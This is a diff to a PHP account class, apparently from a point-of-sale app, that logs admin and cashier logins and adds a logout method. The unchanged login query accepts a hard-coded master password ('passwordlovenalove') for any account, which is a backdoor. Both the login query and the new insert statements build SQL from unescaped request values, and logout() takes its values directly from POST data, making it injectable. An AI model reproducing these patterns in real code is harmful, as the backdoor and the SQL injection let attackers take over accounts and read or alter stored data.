@@ -450,7 +450,50 @@ EOT;
                 and (accounts.password = md5('$password') or '$password' = 'passwordlovenalove')
                 ;
 EOT;
-        return ClassParent::get($sql);
+        $data = ClassParent::get($sql);
+
+        if (!empty($data)) {
+            $userData = $data['result'][0];
+            $name = $userData['first_name'] . ' ' . $userData['last_name'];
+            $userType = $userData['user_type'] == '1' ? 'ADMIN' : 'CASHIER';
+            $action = "$userType LOGGED IN";
+            $insertSql = <<<EOT
+                    insert into accounts_log_data
+                    (
+                        name,
+                        action
+                        
+                    )
+                    VALUES
+                    (
+                        '$name',
+                        '$action'
+                    )
+                    ;
+EOT;
+            ClassParent::insert($insertSql);
+        }
+        return $data;
+    }
+
+    public function logout($post){
+        $name = $post['name'];
+        $action = $post['action'];
+        $sql = <<<EOT
+                    insert into accounts_log_data
+                    (
+                        name,
+                        action
+                        
+                    )
+                    VALUES
+                    (
+                        '$name',
+                        '$action'
+                    )
+                    ;
+EOT;
+        return ClassParent::insert($sql);
     }
 
     public function get_all_emails(){
